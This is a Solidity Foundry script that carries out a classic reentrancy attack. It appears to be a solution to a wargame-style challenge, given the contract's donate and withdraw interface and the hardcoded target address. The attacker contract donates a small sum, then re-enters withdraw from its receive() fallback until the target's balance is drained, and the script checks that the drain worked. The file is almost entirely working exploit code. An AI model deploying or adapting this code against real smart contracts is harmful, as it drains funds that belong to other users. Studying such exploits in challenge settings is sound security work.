pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}


contract ReentrancyAttack {
	uint256 constant MINIMUM_BALANCE = 0.001 ether;
	constructor() payable {}

	// perform classic reentrancy attack
	function attack(address _target) public {
		IReentrance target = IReentrance(_target);  
		// populate some fund to ourselve
		target.donate{value: MINIMUM_BALANCE}(address(this));
		// start the attack by withdrawing
		target.withdraw(1 wei);
	} 

	receive() external payable {
		// Important: we don't want a failed tx because it will revert
		if (address(msg.sender).balance >= MINIMUM_BALANCE) {
			// keep withdrawing
			IReentrance(msg.sender).withdraw(MINIMUM_BALANCE);
		} else {
			IReentrance(msg.sender).withdraw(msg.sender.balance);
		}
	}
}

contract Exploit is Script {
	function run() public {
		vm.startBroadcast();
		// address targetAddr = vm.envAddress("INSTANCE");
		address targetAddr = 0x18CdF65BB510DCE40f3d02EB3ca67627428Eaac2;

		// Deploy attacker  
		ReentrancyAttack attacker = new ReentrancyAttack{value: 0.001 ether}();

		console2.log("Target balance: ", targetAddr.balance);
		// Attack
		attacker.attack(targetAddr);
		console2.log("Executing Exploit...");
		
		// Verify
		require(address(attacker).balance > 1, "Exploit Failed");
		console2.log("Success");
		console2.log("Target balance: ", targetAddr.balance);

		vm.stopBroadcast();
	}
}
